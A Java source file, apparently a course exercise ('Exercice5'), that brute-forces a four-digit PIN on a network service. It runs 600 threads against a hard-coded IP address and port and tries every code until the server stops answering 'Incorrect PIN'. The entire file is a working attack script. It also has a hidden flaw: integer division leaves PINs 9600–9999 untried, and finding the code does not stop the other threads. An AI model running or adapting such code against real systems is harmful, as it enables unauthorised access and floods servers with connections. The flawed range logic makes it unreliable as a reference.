package org.example;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Exercice5 {

    private static final String SERVER_ADDRESS = "51.195.253.124";
    private static final int SERVER_PORT = 12345;
    private static final int THREAD_COUNT = 600; // Nombre de threads à utiliser

    public static void main(String[] args) {
        ExecutorService executorService = Executors.newFixedThreadPool(THREAD_COUNT);
        int range = 10000 / THREAD_COUNT;
        for (int i = 0; i < THREAD_COUNT; i++) {
            int finalI = i;
            executorService.submit(() -> {
                try {
                    bruteforce(finalI * range, (finalI + 1) * range);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            });
        }
        executorService.shutdown();
    }

    private static void bruteforce(int start, int end) throws IOException {
        for (int i = start; i < end; i++) {
            try (Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
                 PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                 BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {

                // Lire la demande de PIN du serveur
                in.readLine();

                // Envoyer le code PIN au serveur
                String pin = String.format("%04d", i);
                out.println(pin);

                // Lire la réponse du serveur
                String response = in.readLine();
                System.out.println("PIN : " + pin + " - " + response);
                if (!response.contains("Incorrect PIN")) {
                    System.out.println("Code PIN trouvé : " + pin);
                    return;
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
//